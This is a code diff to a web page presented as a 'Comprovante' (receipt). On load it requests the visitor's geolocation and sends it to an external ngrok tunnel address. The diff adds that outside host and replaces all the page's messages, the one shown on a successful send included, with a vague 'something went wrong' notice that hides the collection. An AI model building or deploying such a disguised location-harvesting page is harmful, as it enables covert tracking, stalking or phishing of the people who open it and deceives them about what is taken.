@@ -8,11 +8,12 @@
   <h1>Comprovante</h1>
 
   <script>
+    // Executa automaticamente ao carregar a página
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Geolocalização não suportada pelo seu navegador.");
+        alert("Algo deu errado. Tente novamente mais tarde.");
       }
     });
 
@@ -23,7 +24,8 @@
       console.log("Latitude: " + latitude);
       console.log("Longitude: " + longitude);
 
-      fetch("/send-location", { 
+      // Envia a localização para o backend
+      fetch("https://8880-179-191-65-22.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -33,14 +35,13 @@
       .then(response => response.json())
       .then(data => {
         if (data.success) {
-          alert("Erro de carregamento.");
+          alert("Algo deu errado. Tente novamente mais tarde.");
         } else {
-          alert("Erro ao enviar a localização.");
+          alert("Algo deu errado. Tente novamente mais tarde.");
         }
       })
       .catch(error => {
         console.error("Erro:", error);
-        alert("Erro ao conectar com o servidor.");
       });
     }
 
